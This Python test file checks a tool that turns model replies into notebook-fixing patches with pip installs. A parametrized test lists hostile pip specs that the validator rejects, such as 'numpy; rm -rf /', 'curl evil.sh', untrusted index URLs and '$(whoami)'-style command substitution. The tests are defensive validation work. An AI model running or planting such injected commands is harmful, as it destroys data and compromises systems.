from __future__ import annotations

import json

import pytest

from revive.patches import (
    CellEdit,
    Patch,
    PatchApplyError,
    PatchParseError,
    apply_patch,
    extract_json_object,
    parse_patch,
    patch_diff,
    validate_pip_spec,
)
from revive.textutil import strip_reasoning

from conftest import make_notebook, stdout_output

GOOD = {
    "explanation": "np.float was removed",
    "pip_install": ["scikit-learn==1.3.2"],
    "edits": [{"cell_index": 1, "new_source": "x = 1"}],
}


def test_parse_plain_json():
    patch = parse_patch(json.dumps(GOOD))
    assert patch.edits == [CellEdit(1, "x = 1")]
    assert patch.pip_install == ["scikit-learn==1.3.2"]
    assert patch.explanation == "np.float was removed"


def test_parse_fenced_json_with_prose_and_reasoning():
    reply = "<think>let me think {not json}</think>Here is the fix:\n```json\n" + json.dumps(GOOD) + "\n```\nDone."
    assert parse_patch(reply).edits[0].cell_index == 1


def test_parse_json_embedded_in_prose_without_fence():
    reply = "Sure. " + json.dumps(GOOD) + " Hope that helps!"
    assert parse_patch(reply).pip_install == ["scikit-learn==1.3.2"]


def test_new_source_with_newlines_and_quotes_survives():
    source = 'print("a")\nprint(\'b\')\n'
    reply = json.dumps({"edits": [{"cell_index": 0, "new_source": source}]})
    assert parse_patch(reply).edits[0].new_source == source


@pytest.mark.parametrize(
    "reply",
    [
        "no json at all",
        "{}",
        '{"edits": []}',
        '{"edits": "nope"}',
        '{"edits": [{"cell_index": "1", "new_source": "x"}]}',
        '{"edits": [{"cell_index": true, "new_source": "x"}]}',
        '{"edits": [{"cell_index": -1, "new_source": "x"}]}',
        '{"edits": [{"cell_index": 1, "new_source": 5}]}',
        '{"edits": ["x"]}',
        '{"pip_install": "numpy"}',
    ],
)
def test_bad_patches_are_rejected(reply):
    with pytest.raises(PatchParseError):
        parse_patch(reply)


@pytest.mark.parametrize(
    "spec", ["numpy", "numpy==1.26.4", "pandas<2", "scikit-learn>=1.0", "torch==2.1.*", "uvicorn[standard]==0.29.0", "numpy == 1.26.4"]
)
def test_valid_pip_specs(spec):
    assert validate_pip_spec(spec) == spec.replace(" ", "")


@pytest.mark.parametrize(
    "spec",
    [
        "numpy; rm -rf /",
        "numpy && curl evil.sh",
        "git+https://github.com/x/y",
        "https://evil.example/pkg.whl",
        "-r requirements.txt",
        "--index-url=http://evil",
        "numpy==1.0 --extra-index-url http://evil",
        "$(whoami)",
        "numpy`id`",
        "",
        5,
        None,
    ],
)
def test_malicious_pip_specs_are_rejected(spec):
    with pytest.raises(PatchParseError):
        validate_pip_spec(spec)


def test_too_many_pip_specs_rejected():
    reply = json.dumps({"pip_install": [f"pkg{i}" for i in range(11)]})
    with pytest.raises(PatchParseError):
        parse_patch(reply)


def test_extract_json_skips_broken_outer_object():
    obj = extract_json_object('{"broken": ... } then {"ok": 1}')
    assert obj == {"ok": 1}


def test_apply_patch_edits_source_and_clears_outputs_without_mutating_input():
    nb = make_notebook("a = 1", ("print(a)", [stdout_output("1\n")]))
    patched = apply_patch(nb, Patch(edits=[CellEdit(1, "print(a + 1)")]))
    assert patched.cells[1].source == "print(a + 1)"
    assert patched.cells[1].outputs == []
    assert nb.cells[1].source == "print(a)"          # original untouched
    assert len(nb.cells[1].outputs) == 1


def test_apply_patch_rejects_out_of_range_and_non_code_cells():
    nb = make_notebook(("md", "# t"), "a = 1")
    with pytest.raises(PatchApplyError):
        apply_patch(nb, Patch(edits=[CellEdit(5, "x")]))
    with pytest.raises(PatchApplyError):
        apply_patch(nb, Patch(edits=[CellEdit(0, "x")]))


def test_patch_diff_shows_removed_and_added_lines():
    nb = make_notebook("x = np.float(1)")
    patch = Patch(edits=[CellEdit(0, "x = np.float64(1)")], pip_install=["numpy==1.26.4"])
    diff = patch_diff(nb, patch)
    assert "-x = np.float(1)" in diff and "+x = np.float64(1)" in diff
    assert "pip install numpy==1.26.4" in diff


@pytest.mark.parametrize(
    "raw,expected",
    [
        ("<think>hmm</think>answer", "answer"),
        ("reasoning only</think>answer", "answer"),
        ("answer<think>truncated reasoning", "answer"),
        ("plain answer", "plain answer"),
        ("", ""),
        (None, ""),
        ("<THINK>x</THINK> Done ", "Done"),
    ],
)
def test_strip_reasoning(raw, expected):
    assert strip_reasoning(raw) == expected
